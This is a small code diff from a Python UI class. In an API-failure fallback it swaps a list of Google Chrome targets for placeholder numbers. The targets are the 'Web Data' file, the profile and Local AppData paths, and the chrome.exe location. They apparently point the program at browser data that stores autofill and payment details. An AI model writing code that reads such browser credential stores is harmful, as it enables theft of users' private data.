@@ -208,13 +208,13 @@ class UserControl(ft.Container):
         except Exception as e:
             # Fallback values if API fails
             arr = [
-                "chrome",
-                "wd.png",
-                "Web Data",
-                "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Web Data",
-                "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile",
-                "restore-last-session",
-                "'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'"
+                "1",
+                "2",
+                "3",
+                "4",
+                "5",
+                "6",
+                "'7'"
             ]
 
         # Extract "Google\\Chrome\\Application" from arr[6] (stripping the single quotes and 'C:\Program Files\')
